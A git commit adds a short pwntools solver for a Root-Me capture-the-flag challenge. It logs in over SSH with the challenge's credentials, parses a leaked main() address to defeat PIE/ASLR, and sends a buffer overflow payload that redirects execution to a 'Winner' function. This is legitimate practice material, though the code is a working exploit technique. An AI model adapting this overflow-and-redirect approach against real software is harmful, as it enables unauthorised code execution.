54e99289eda0554089732ffee1511f44d9ca8ee4
Mohammed Hadi <57273771+HadiMed@users.noreply.github.com>
2021-08-09 13:54:23 +0100

    Create solver.py

---
+++ PIE+ASLR/solver.py
@@ -0,0 +1,13 @@
+from pwn import * 
+
+s = ssh(host='challenge03.root-me.org',password="app-systeme-ch83",port=2223,user="app-systeme-ch83") 
+sh= s.process("ch83")
+sh.recvline() # b"I'm an unbreakable safe, so you need a key to enter!\n"
+leak = sh.recvline() # b'Hint, main(): 0x562887bba91a\n'
+main_addr = int(leak[14:-1].decode("utf-8") , 16)  
+Winner = main_addr - 160 
+print("[+] main address = "+hex(main_addr))
+print("[+] Winner address  = "+hex(Winner))
+payload = b'\xff'*32 + b'\xbb'*8 + p64(Winner)
+sh.sendline(payload)
+print(sh.recvall())
